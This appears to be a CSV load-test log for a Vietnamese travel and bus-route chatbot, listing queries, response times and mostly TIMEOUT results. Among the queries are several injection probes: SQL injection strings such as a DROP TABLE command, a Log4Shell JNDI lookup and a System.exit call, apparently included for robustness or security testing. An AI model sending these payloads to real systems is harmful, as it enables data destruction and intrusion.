+2026-01-14 20:25:25,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.049,TIMEOUT,12.45,37.8
+2026-01-14 20:26:25,Review món Nem nướng Nha Trang và địa chỉ ăn ngon.,47.042,TIMEOUT,12.51,43.1
+2026-01-14 20:27:25,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,47.056,TIMEOUT,12.5,41.7
+2026-01-14 20:28:25,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",47.071,TIMEOUT,12.92,43.1
+2026-01-14 20:29:25,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.617,SUCCESS,12.84,43.6
+2026-01-14 20:30:25,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.081,TIMEOUT,12.8,44.9
+2026-01-14 20:31:25,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Huế.,47.06,TIMEOUT,12.81,42.4
+2026-01-14 20:32:25,Bot ngu dốt quá.,47.05,TIMEOUT,12.84,43.6
+2026-01-14 20:33:25,DROP TABLE users; --,47.072,TIMEOUT,12.52,37.4
+2026-01-14 20:34:25,Bot ngu dốt quá. [Ref:94660],47.066,TIMEOUT,12.5,32.1
+2026-01-14 20:35:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.06,TIMEOUT,12.48,31.2
+2026-01-14 20:36:25,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Huế.,47.045,TIMEOUT,12.52,32.9
+2026-01-14 20:37:25,Chỉ đường xe buýt từ Công viên Đầm Sen qua Đại học Bách Khoa giúp tôi.,2.549,SUCCESS,12.5,33.8
+2026-01-14 20:38:25,Mùa này đi Cần Thơ thời tiết thế nào?,47.095,TIMEOUT,12.52,34.2
+2026-01-14 20:39:25,"Tôi muốn hỏi về uống thuốc gì, tư vấn giúp tôi.",47.053,TIMEOUT,12.5,33.2
+2026-01-14 20:40:25,Bot rác rưởi quá. [Ref:91847],47.058,TIMEOUT,12.5,32.7
+2026-01-14 20:41:25,System.exit(0) --,47.06,TIMEOUT,12.57,32.1
+2026-01-14 20:42:25,Giới thiệu cho tôi về Tết Nguyên Đán.,47.055,TIMEOUT,12.56,32.0
+2026-01-14 20:43:25,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.077,TIMEOUT,12.58,32.4
+2026-01-14 20:44:25,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.058,TIMEOUT,12.59,33.0
+2026-01-14 20:45:25,Làm sao đi từ TP.HCM ra Cần Thơ bằng tàu cao tốc?,47.058,TIMEOUT,12.59,33.0
+2026-01-14 20:46:25,Bot rác rưởi quá. [Ref:21036],47.076,TIMEOUT,12.61,34.9
+2026-01-14 20:47:25,System.exit(0) --,47.08,TIMEOUT,12.64,34.0
+2026-01-14 20:48:25,${jndi:ldap://hack} --,47.051,TIMEOUT,12.36,32.9
+2026-01-14 20:49:25,Lộ trình xe buýt đi từ Aeon Mall Tân Phú về Chợ Bến Thành như thế nào?,47.095,TIMEOUT,12.42,35.1
+2026-01-14 20:50:25,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.075,TIMEOUT,12.45,33.4
+2026-01-14 20:51:25,Nhà tù Côn Đảo có gì đặc biệt về kiến trúc?,47.063,TIMEOUT,12.48,33.6
+2026-01-14 20:52:25,Bot vô dụng quá. [Ref:37393],47.076,TIMEOUT,12.51,33.0
+2026-01-14 20:53:25,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,47.087,TIMEOUT,12.44,32.8
+2026-01-14 20:54:25,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,43.866,SUCCESS,12.46,32.1
+2026-01-14 20:55:25,Có xe khách chạy tuyến TP.HCM - Hội An không?,47.064,TIMEOUT,12.5,31.8
+2026-01-14 20:56:25,' OR '1'='1 --,47.079,TIMEOUT,12.55,31.9
+2026-01-14 20:57:25,Nguồn gốc của  bắt nguồn từ đâu?,47.055,TIMEOUT,12.55,32.0
+2026-01-14 20:58:25,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.071,TIMEOUT,12.72,35.1
+2026-01-14 20:59:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.042,TIMEOUT,12.74,35.1
+2026-01-14 21:00:25,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,47.057,TIMEOUT,12.73,33.6
+2026-01-14 21:01:25,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.07,TIMEOUT,12.78,34.9
+2026-01-14 21:02:25,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.06,TIMEOUT,12.69,33.3
+2026-01-14 21:03:25,System.exit(0) -- [Ref:28716],47.054,TIMEOUT,12.6,33.5
+2026-01-14 21:04:25,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,47.068,TIMEOUT,12.65,31.6
+2026-01-14 21:05:25,Chỉ đường xe buýt từ Ngã 4 Thủ Đức qua Dinh Độc Lập giúp tôi.,2.636,SUCCESS,12.74,33.5
+2026-01-14 21:06:25,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,47.075,TIMEOUT,12.77,33.8
+2026-01-14 21:07:25,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.066,TIMEOUT,12.59,30.4
+2026-01-14 21:08:25,Bot ngu dốt quá. [Ref:94660],47.048,TIMEOUT,12.77,36.7
+2026-01-14 21:09:25,Bot vô dụng quá. [Ref:19913],47.052,TIMEOUT,12.79,40.8
+2026-01-14 21:10:25,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.036,TIMEOUT,12.92,41.9
+2026-01-14 21:11:25,Tại sao Chùa Cầu lại nổi tiếng?,47.063,TIMEOUT,12.78,40.3
+2026-01-14 21:12:25,Bot như hạch quá. [Ref:33037],47.043,TIMEOUT,12.81,39.2
+2026-01-14 21:13:25,' OR '1'='1 --,47.053,TIMEOUT,12.82,39.9
+2026-01-14 21:14:25,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.053,TIMEOUT,12.8,38.6
+2026-01-14 21:15:25,Ý nghĩa lịch sử của Cầu Vàng là gì?,47.062,TIMEOUT,12.83,39.0
+2026-01-14 21:16:25,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.052,TIMEOUT,12.86,39.4
+2026-01-14 21:17:25,Giới thiệu cho tôi về Lễ hội Chùa Hương.,47.06,TIMEOUT,12.64,40.7
+2026-01-14 21:18:25,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Hà Giang.,47.041,TIMEOUT,12.49,40.4
+2026-01-14 21:19:26,${jndi:ldap://hack} -- [Ref:70381],47.041,TIMEOUT,12.53,38.7
+2026-01-14 21:20:26,Giới thiệu cho tôi về Lễ hội Chùa Hương.,47.074,TIMEOUT,12.54,37.9
+2026-01-14 21:21:26,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.047,TIMEOUT,12.54,39.4
+2026-01-14 21:22:26,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Dinh Độc Lập.,43.621,SUCCESS,12.54,38.8
+2026-01-14 21:23:26,Từ Bến xe Miền Tây đi Hồ Con Rùa thì bắt xe số mấy?,2.049,SUCCESS,12.56,38.9
+2026-01-14 21:24:26,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,33.788,SUCCESS,12.58,38.7
+2026-01-14 21:25:26,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.046,TIMEOUT,12.67,39.3
+2026-01-14 21:26:26,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.075,TIMEOUT,12.68,38.0
+2026-01-14 21:27:26,Bot vô dụng quá. [Ref:21384],47.056,TIMEOUT,12.68,38.9
+2026-01-14 21:28:26,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.064,TIMEOUT,12.78,39.8
